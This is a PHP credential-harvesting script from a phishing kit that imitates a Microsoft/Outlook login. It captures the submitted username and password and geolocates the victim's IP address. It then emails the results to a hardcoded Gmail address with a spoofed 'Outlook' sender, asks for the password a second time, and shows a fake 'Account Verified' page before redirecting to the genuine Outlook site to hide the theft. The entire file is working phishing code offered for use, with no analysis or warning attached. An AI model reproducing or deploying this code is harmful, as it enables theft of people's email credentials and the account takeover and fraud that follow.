<?php
@session_start();

function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
    $output = NULL;
    if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
        $ip = $_SERVER["REMOTE_ADDR"];
        if ($deep_detect) {
            if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
    }
    $purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
    $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
    $continents = array(
        "AF" => "Africa",
        "AN" => "Antarctica",
        "AS" => "Asia",
        "EU" => "Europe",
        "OC" => "Australia (Oceania)",
        "NA" => "North America",
        "SA" => "South America"
    );
    if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
        $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
        if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
            switch ($purpose) {
                case "location":
                    $output = array(
                        "city"           => @$ipdat->geoplugin_city,
                        "state"          => @$ipdat->geoplugin_regionName,
                        "country"        => @$ipdat->geoplugin_countryName,
                        "country_code"   => @$ipdat->geoplugin_countryCode,
                        "continent"      => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
                        "continent_code" => @$ipdat->geoplugin_continentCode
                    );
                    break;
                case "address":
                    $address = array($ipdat->geoplugin_countryName);
                    if (@strlen($ipdat->geoplugin_regionName) >= 1)
                        $address[] = $ipdat->geoplugin_regionName;
                    if (@strlen($ipdat->geoplugin_city) >= 1)
                        $address[] = $ipdat->geoplugin_city;
                    $output = implode(", ", array_reverse($address));
                    break;
                case "city":
                    $output = @$ipdat->geoplugin_city;
                    break;
                case "state":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "region":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "country":
                    $output = @$ipdat->geoplugin_countryName;
                    break;
                case "countrycode":
                    $output = @$ipdat->geoplugin_countryCode;
                    break;
            }
        }
    }
    return $output;
}

if (isset($_SERVER['HTTP_CLIENT_IP'])) {
	$real_ip_adress = $_SERVER['HTTP_CLIENT_IP'];
}
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	$real_ip_adress = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
else {
	$real_ip_adress = $_SERVER['REMOTE_ADDR'];
}

$mail_to = "keynesmilton6@gmail.com";

$cip = $real_ip_adress;
$address = ip_info("Visitor", "Address");
$main_country = ip_info("Visitor", "Country");

$mail = "You have a microsoft drop";
$mail .= "Login ID : ".$_POST['login']."\n";
$mail .= "Passwd : ".$_POST['passwd']."\n";
$mail .= "Address : ".$cip."\n";
$mail .= "Location : ".$address."\n";
$mail .= "----------------------Weezy 2018-\n";
$sender = "From: Outlook <info@rumail.com";

$sub = "Outlook Alert - ".$main_country;
	
if(!isset($_SESSION['isErr'])) {
	mail($mail_to, $sub, $mail, $sender);
	$_SESSION['isErr'] = "1";
	print '<script>window.history.back();</script>';
}
else {
	mail($mail_to, $sub, $mail, $sender);
	session_destroy();
?>
<!doctype html>
<html>
	<head>
		<link type="text/css" rel="stylesheet" href="asset/sendspace.css">
		<link rel="shortcut icon" href="favicon.ico">
		<title>Microsoft account</title>
	</head>
	<body style="font-family:arial; font-weight:normal;">
		<center>
			<br />
			<img src="logo.svg" />
			<br />
			<h1>Account Verified</h1>
			<h3>You have successfully validated your account</h3>
			<p><img src="load.gif" alt="" /></p>
			<p>Please wait while we redirect you to your mailbox</p>
		</center>
<script type="text/javascript">
function viewInvoice() {
	document.location.href="https://outlook.office365.com/owa/";
}

setTimeout(viewInvoice, 9000);
</script>
	</body>
</html>
<?php
}
?>
